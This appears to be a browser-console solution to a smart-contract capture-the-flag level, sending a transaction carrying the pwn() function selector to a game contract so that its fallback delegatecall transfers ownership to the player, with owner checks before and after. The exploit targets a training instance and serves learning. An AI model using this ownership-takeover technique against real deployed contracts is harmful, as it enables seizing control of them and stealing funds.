contract.owner()
web3.eth.sendTransaction({from:player,to:instance,data:web3.sha3("pwn()").slice(0,10),gas: 1111111},function(x,y){console.error(y)});
//The MetaMask Web3 object does not support synchronous methods like eth_sendTransaction without a callback parameter.
contract.owner()